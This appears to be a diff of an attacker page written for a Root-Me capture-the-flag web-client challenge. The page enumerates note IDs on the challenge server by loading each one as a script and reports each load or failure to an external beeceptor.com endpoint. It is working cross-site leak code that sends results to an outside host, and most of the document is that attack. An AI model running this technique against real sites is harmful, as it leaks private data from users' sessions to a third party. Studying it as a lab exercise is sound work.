@@ -4,81 +4,34 @@
 </head>
 <body>
 <script>
-// Create a new script element
-  const script = document.createElement('script');
-  
-  // Set the script src to the target URL
-  script.src = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/2278';
-  
-  // Define a success callback when the script loads
-  script.onload = function() {
-    // Query the web service when the script loads successfully
-    fetch('https://rootmeleak2.free.beeceptor.com/success?status=success')
-      .then(response => {
-        if (response.ok) {
-          console.log('Script loaded successfully and report sent');
-        } else {
-          console.log('Error sending report');
-        }
-      })
-      .catch(error => {
-        console.error('Network error or CORS issue:', error);
-      });
-  };
-  
-  // Define an error callback if the script fails to load
-  script.onerror = function() {
-    // Query the web service if the script fails to load
-    fetch('https://rootmeleak2.free.beeceptor.com/error?status=failed')
-      .then(response => {
-        if (response.ok) {
-          console.log('Error report sent');
-        } else {
-          console.log('Error sending report');
-        }
-      })
-      .catch(error => {
-        console.error('Network error or CORS issue:', error);
-      });
-  };
-  
-  // Append the script to the document body to start loading it
-  document.body.appendChild(script);
-
-
-    /*
     const chars = 'abcdefghijklmnopqrstuvwxyz0123456789_', base = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/';
-let id = 2270;
+let id = 0;
 
 async function findValidUrl() {
     while (true) {
         let url = base + id;
         let start = Date.now();
 
-        let obj = document.createElement('object');
-        obj.data = url;
-        obj.type = 'text/html';  // Ou un autre type en fonction de ce que tu attends du serveur
-
-        // Événement de chargement réussi
-        obj.onload = () => {
-            fetch("https://rootmeleak2.free.beeceptor.com/" + url);
-            console.log("URL valide :", url);  // Si l'objet est chargé en moins de 2000ms, c'est une URL valide
+        const script = document.createElement('script');
+        
+        script.src = url;
+        
+        script.onload = function() {
+          fetch('https://rootmeleak2.free.beeceptor.com/success?status=success')
         };
-
-        // Événement d'erreur
-        obj.onerror = () => {
-            let duration = Date.now() - start;
-            console.log("Erreur lors du chargement de l'URL :", url);
+        
+        script.onerror = function() {
+          fetch('https://rootmeleak2.free.beeceptor.com/error?status=failed')
         };
-
-        // Ajout de l'élément <object> à la page (non visible)
-        document.body.appendChild(obj);
+        
+        // Append the script to the document body to start loading it
+        document.body.appendChild(script);
 
         // Attente avant la prochaine requête
         await new Promise(r => setTimeout(r, 100));
         id++;
 
-        if(id > 2200) break;
+        if(id > 2300) break;
     }
 }
 
@@ -108,7 +61,7 @@ function noteSearch(url) {
 }
 
 findValidUrl();
-*/
+
 </script>
     
 </body>
